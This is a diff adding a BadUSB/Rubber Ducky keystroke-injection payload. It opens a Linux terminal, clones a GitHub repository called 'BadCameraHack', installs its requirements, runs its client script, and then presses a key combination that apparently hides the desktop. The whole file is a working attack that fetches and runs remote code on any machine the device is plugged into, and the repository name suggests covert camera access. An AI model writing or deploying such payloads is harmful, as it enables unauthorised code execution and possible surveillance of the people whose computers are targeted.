@@ -1,0 +1,16 @@
+CONTROL ALT T
+DELAY 10000
+STRING cd ~/
+ENTER
+STRING git clone https://github.com/Amazingct/BadCameraHack.git
+ENTER
+DELAY 1000
+STRING cd BadCameraHack
+ENTER
+DELAY 1000
+STRING pip install -r requirements.txt
+ENTER
+DELAY 1000
+STRING python Client/main.py
+ENTER
+CONTROL ALT D
